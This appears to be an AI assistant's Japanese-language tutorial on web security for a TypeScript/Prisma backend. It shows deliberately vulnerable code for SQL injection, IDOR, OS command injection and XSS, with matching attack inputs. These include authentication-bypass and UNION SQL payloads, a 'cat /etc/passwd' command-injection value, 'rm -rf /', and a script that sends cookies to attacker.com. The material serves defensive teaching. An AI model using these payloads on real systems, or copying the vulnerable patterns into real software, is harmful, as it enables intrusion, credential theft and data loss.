はい、もちろんです！
脆弱性の名前だけ聞いてもピンとこないのは当然です。攻撃者が実際にどんな「ヤバいリクエスト（クエリ）」を送ってくるのか、具体的な例をコードと合わせて見ていきましょう。

これを見ると、「なるほど、だからあの対策が必要なのか！」と納得できるはずです。

---

## 1\. SQL インジェクション

前回、「Prisma を普通に使えば安全」と言いましたが、もし生クエリを**文字列結合**で作ってしまうと、こんな攻撃が可能になります。

### 脆弱なコードの例

```typescript
// ⚠️ 絶対にやってはいけない、脆弱なコード
import { PrismaClient } from "@prisma/client";
const prisma = new PrismaClient();

app.post("/login", async (req, res) => {
  const { email, password } = req.body;

  // ユーザーからの入力を直接SQL文に埋め込んでいる
  const query = `SELECT * FROM "User" WHERE email = '${email}' AND password = '${password}'`;

  // $queryRawUnsafe は文字列をそのまま実行するため非常に危険
  const user = await prisma.$queryRawUnsafe(query);

  if (user) {
    res.send("ログイン成功！");
  } else {
    res.status(401).send("メールアドレスかパスワードが違います");
  }
});
```

---

### ヤバい攻撃リクエストの例 (認証回避)

攻撃者は、ログイン画面でこんなふうに入力してきます。

- **メールアドレス:** `admin@example.com`
- **パスワード:** `anything' OR '1'='1`

#### 何が起きるか？

この入力が脆弱なコードに渡されると、実行される SQL 文はこうなります。

```sql
SELECT * FROM "User" WHERE email = 'admin@example.com' AND password = 'anything' OR '1'='1'
```

データベースはこれをどう解釈するかというと…
`password = 'anything'` の部分は**偽 (false)になりますが、その後の `OR '1'='1'` は常に真 (true)です。
SQL の`WHERE`句は、`false OR true` の結果を `true` と判断するため、パスワードが間違っていても条件が成立してしまい、admin としてログインできてしまいます。これが認証回避**です。

---

### ヤバい攻撃リクエストの例 (情報窃取)

検索機能などで、URL のパラメータにこんな値を仕込んできます。

`GET /api/items/search?query=' UNION SELECT email, password FROM "User" --`

#### 何が起きるか？

脆弱なコードが `SELECT * FROM "Item" WHERE name = '...'` のような SQL 文を組み立てているとします。攻撃者の入力が入ると、SQL 文はこうなります。

```sql
SELECT * FROM "Item" WHERE name = '' UNION SELECT email, password FROM "User" --'
```

`UNION`は、2 つの`SELECT`文の結果をくっつける命令です。`--` はコメントアウトなので、それ以降の SQL 文は無視されます。
結果として、**商品の検索結果に加えて、`User`テーブルに入っている全ユーザーのメールアドレスとパスワードがくっついて、攻撃者の画面に表示されてしまいます。** これが**情報漏洩**です。

**👉 だからこそ、Prisma の安全なメソッドやパラメータ化されたクエリを使い、ユーザー入力を SQL 文の構造に影響させない対策が絶対に必要なんです。**

---

## 2\. 不適切なアクセス制御 (IDOR - Insecure Direct Object References)

これは非常にシンプルですが、極めて危険な攻撃です。特別なツールは必要なく、ブラウザで URL を書き換えるだけで成立します。

### 脆弱なコードの例

```typescript
// ⚠️ 権限チェックがない、脆弱なコード
app.get("/api/orders/:orderId", protect, async (req, res) => {
  const { orderId } = req.params;
  // ★★★ ログインは確認したが、その注文が本当に
  // ★★★ このユーザーのものかを確認していない！ ★★★

  const order = await prisma.order.findUnique({
    where: { id: orderId },
  });

  if (order) {
    res.json(order);
  } else {
    res.status(404).send("Order not found");
  }
});
```

---

### ヤバい攻撃リクエストの例

1.  攻撃者 A (ユーザー ID: `user-123`) が自分のサイトにログインします。
2.  自分の注文履歴ページを開くと、URL が `https://example.com/orders/abc-999` となっているのを確認します。
3.  攻撃者 A は、URL の ID 部分を推測しやすい別の値に変えて、直接アクセスを試みます。

`GET https://example.com/api/orders/abc-100`
`GET https://example.com/api/orders/abc-101`
`GET https://example.com/api/orders/abc-102`

#### 何が起きるか？

脆弱なコードは、リクエストしてきたのがログインユーザーであること（`protect`ミドルウェア）は確認していますが、**「`orderId`で指定された注文が、そのログインユーザーのものであるか」を検証していません。**
そのため、URL の ID を次々に変えていくだけで、**他人の注文情報（購入商品、金額、配送先住所、氏名など）が丸見え**になってしまいます。

**👉 だからこそ、「リクエストされたリソースの所有者 ID と、セッションのユーザー ID が一致するか」を必ずチェックする対策が必要なんです。**

---

## 3\. OS コマンドインジェクション

サーバー上で OS のコマンドを実行できる機能がある場合、非常に危険な攻撃を受ける可能性があります。

### 脆弱なコードの例

```typescript
// ⚠️ ユーザー入力を直接コマンドに渡す、脆弱なコード
import { execSync } from "child_process";

// 画像のサイズ情報を取得するAPIのつもり
app.get("/api/image/info", (req, res) => {
  const filename = req.query.filename as string;

  // ユーザーが指定したファイル名をそのままOSコマンドに渡している
  try {
    const result = execSync(`ls -l assets/${filename}`);
    res.send(`<pre>${result.toString()}</pre>`);
  } catch (e) {
    res.status(500).send("Error");
  }
});
```

---

### ヤバい攻撃リクエストの例

攻撃者は、URL のクエリパラメータに、別のコマンドを連結して送信します。
`GET /api/image/info?filename=myimage.jpg; cat /etc/passwd`

#### 何が起きるか？

多くのシェルでは、セミコロン `;` は「前のコマンドが終わったら、次のコマンドを実行する」という意味です。
そのため、サーバー上で実行されるコマンドは以下のようになります。

```bash
ls -l assets/myimage.jpg; cat /etc/passwd
```

`ls`コマンドが正常に実行された後、続けて**サーバーのパスワード情報が書かれた重要ファイル`/etc/passwd`を読み取る`cat`コマンドが実行されます。** その結果がレスポンスとして攻撃者に返ってしまい、システムの内部情報がごっそり盗まれてしまいます。
`rm -rf /` のような、サーバーの全ファイルを削除するコマンドを仕込まれる可能性すらあります。

**👉 だからこそ、ユーザーからの入力を OS コマンドの引数として絶対に直接使わず、安全な API やライブラリを利用する対策が必要なんです。**

---

## 4\. クロスサイトスクリプティング (XSS)

### 脆弱なコードの例

バックエンドは、ユーザーからの入力を無害化（サニタイズ）せずにそのまま DB に保存します。

```typescript
// ⚠️ ユーザーの入力をそのまま保存する、脆弱なコード
app.post("/api/comments", protect, async (req, res) => {
  const { commentText } = req.body;
  const userId = req.user.id;

  // 入力されたコメントを何も処理せずにDBに保存
  const comment = await prisma.comment.create({
    data: {
      text: commentText, // ここに悪意のあるスクリプトがそのまま入る
      authorId: userId,
    },
  });
  res.status(201).json(comment);
});
```

そして、フロントエンドがそのデータを API から受け取り、エスケープ処理をせずに HTML に描画します。
`document.getElementById('comments').innerHTML += '<div>' + comment.text + '</div>';`

---

### ヤバい攻撃リクエストの例

攻撃者は、コメント投稿フォームに、ただの文章ではなく HTML タグを埋め込んで送信します。

`POST /api/comments`
**リクエストボディ:**

```json
{
  "commentText": "この商品、最高ですね！<script>fetch('https://attacker.com/steal?cookie=' + document.cookie);</script>"
}
```

#### 何が起きるか？

1.  この`<script>`タグを含んだ悪意のある文字列が、**そのままデータベースに保存されます。**
2.  他の無関係なユーザーがこのコメントが含まれるページを閲覧します。
3.  フロントエンドのコードが、DB から取得したコメントテキストを画面に表示しようとします。
4.  このとき、ブラウザは`commentText`内の`<script>`タグをただの文字列ではなく\*\*「実行すべき命令」\*\*として解釈してしまいます。
5.  スクリプトが実行され、**閲覧しているユーザーのクッキー情報（セッション ID など）が、攻撃者のサーバー(`attacker.com`)に送信されます。**
6.  攻撃者は盗んだクッキーを使ってそのユーザーになりすまし、アカウントを乗っ取ります。

**👉 だからこそ、バックエンドでは入力値を適切に処理（サニタイズ）し、フロントエンドでは出力時に必ずエスケープする、という両面からの対策が重要なんです。**
